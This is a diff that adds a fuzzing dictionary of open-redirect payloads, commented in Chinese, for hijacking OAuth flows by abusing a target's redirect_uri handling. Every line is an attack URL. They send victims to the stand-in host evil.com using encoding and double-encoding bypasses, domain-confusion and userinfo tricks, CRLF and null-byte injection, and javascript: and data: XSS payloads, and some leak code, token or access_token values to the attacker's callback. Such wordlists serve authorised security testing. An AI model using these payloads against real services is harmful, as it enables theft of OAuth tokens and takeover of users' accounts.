@@ -1,0 +1,126 @@
+# OAuth Redirect URI - Open Redirect Attack Dictionary
+# 开放重定向攻击模式 - 利用目标站点的开放重定向漏洞进行OAuth劫持
+# 用于测试目标是否正确验证redirect_uri参数
+
+# 基础开放重定向模式
+https://target.com/redirect?url=https://evil.com
+https://target.com/redirect?next=https://evil.com
+https://target.com/redirect?return=https://evil.com
+https://target.com/redirect?return_to=https://evil.com
+https://target.com/redirect?redirect=https://evil.com
+https://target.com/redirect?redirect_uri=https://evil.com
+https://target.com/redirect?dest=https://evil.com
+https://target.com/redirect?destination=https://evil.com
+https://target.com/redirect?target=https://evil.com
+https://target.com/redirect?go=https://evil.com
+https://target.com/redirect?link=https://evil.com
+https://target.com/redirect?forward=https://evil.com
+https://target.com/redirect?continue=https://evil.com
+https://target.com/redirect?redir=https://evil.com
+https://target.com/redirect?rurl=https://evil.com
+https://target.com/redirect?returnUrl=https://evil.com
+https://target.com/redirect?return_url=https://evil.com
+https://target.com/redirect?redirectUrl=https://evil.com
+https://target.com/redirect?redirect_url=https://evil.com
+
+# 常见开放重定向端点
+https://target.com/logout?redirect=https://evil.com
+https://target.com/login?next=https://evil.com
+https://target.com/auth/callback?redirect=https://evil.com
+https://target.com/oauth/callback?next=https://evil.com
+https://target.com/signin?return=https://evil.com
+https://target.com/signout?redirect=https://evil.com
+https://target.com/account/redirect?url=https://evil.com
+https://target.com/user/redirect?next=https://evil.com
+https://target.com/app/redirect?go=https://evil.com
+https://target.com/api/redirect?url=https://evil.com
+
+# 参数嵌套开放重定向
+https://target.com/redirect?url=https://target.com/redirect?url=https://evil.com
+https://target.com/go?next=https://target.com/go?next=https://evil.com
+https://target.com/out?dest=https://target.com/out?dest=https://evil.com
+
+# URL编码开放重定向
+https://target.com/redirect?url=https%3A%2F%2Fevil.com
+https://target.com/redirect?url=https%3a%2f%2fevil.com
+https://target.com/redirect?next=https%3A%2F%2Fevil.com
+https://target.com/redirect?return=https%3A%2F%2Fevil.com
+
+# 双编码开放重定向
+https://target.com/redirect?url=https%253A%252F%252Fevil.com
+https://target.com/redirect?url=https%253a%252f%252fevil.com
+
+# 混合编码开放重定向
+https://target.com/redirect?url=https%3A%2F%2Fevil%2Ecom
+https://target.com/redirect?url=https%3A//evil.com
+https://target.com/redirect?url=https:%2F%2Fevil.com
+
+# 带路径的开放重定向
+https://target.com/redirect?url=https://evil.com/callback
+https://target.com/redirect?next=https://evil.com/oauth/callback
+https://target.com/redirect?return=https://evil.com/auth/callback
+
+# 带查询参数的开放重定向
+https://target.com/redirect?url=https://evil.com/callback?code=123
+https://target.com/redirect?next=https://evil.com/callback?state=abc
+https://target.com/redirect?return=https://evil.com/callback?token=xyz
+
+# 带Fragment的开放重定向
+https://target.com/redirect?url=https://evil.com/callback#token=123
+https://target.com/redirect?next=https://evil.com/callback#access_token=abc
+
+# 协议相对URL开放重定向
+https://target.com/redirect?url=//evil.com
+https://target.com/redirect?url=//evil.com/callback
+https://target.com/redirect?next=//evil.com
+https://target.com/redirect?return=//evil.com
+
+# 域名前缀绕过开放重定向
+https://target.com/redirect?url=https://evil.com.target.com
+https://target.com/redirect?url=https://target.com.evil.com
+https://target.com/redirect?url=https://target.com%2F.evil.com
+https://target.com/redirect?url=https://target.com@evil.com
+https://target.com/redirect?url=https://evil.com%3Ftarget.com
+https://target.com/redirect?url=https://evil.com%23target.com
+
+# 特殊字符开放重定向
+https://target.com/redirect?url=https://evil.com%00
+https://target.com/redirect?url=https://evil.com%0d%0a
+https://target.com/redirect?url=https://evil.com%0a
+https://target.com/redirect?url=https://evil.com%0d
+
+# JavaScript协议开放重定向
+https://target.com/redirect?url=javascript:alert(1)
+https://target.com/redirect?url=javascript:document.location='https://evil.com'
+https://target.com/redirect?url=data:text/html,<script>alert(1)</script>
+
+# 多参数开放重定向
+https://target.com/redirect?url=https://evil.com&next=https://good.com
+https://target.com/redirect?next=https://evil.com&url=https://good.com
+https://target.com/redirect?url=https://good.com&redirect=https://evil.com
+
+# 空参数开放重定向
+https://target.com/redirect?url=
+https://target.com/redirect?next=
+https://target.com/redirect?return=
+https://target.com/redirect?redirect=
+
+# 相对路径开放重定向
+https://target.com/redirect?url=/callback
+https://target.com/redirect?url=//callback
+https://target.com/redirect?url=///evil.com
+https://target.com/redirect?url=////evil.com
+
+# 带认证信息的开放重定向
+https://target.com/redirect?url=https://user:pass@evil.com
+https://target.com/redirect?url=https://admin:admin@evil.com
+
+# 带端口号的开放重定向
+https://target.com/redirect?url=https://evil.com:8080
+https://target.com/redirect?url=https://evil.com:443
+https://target.com/redirect?url=https://evil.com:80
+
+# 国际化域名开放重定向
+https://target.com/redirect?url=https://xn--e1afmkfd.xn--p1ai
+https://target.com/redirect?url=https://例え.jp
+https://target.com/redirect?url=https://中国.cn
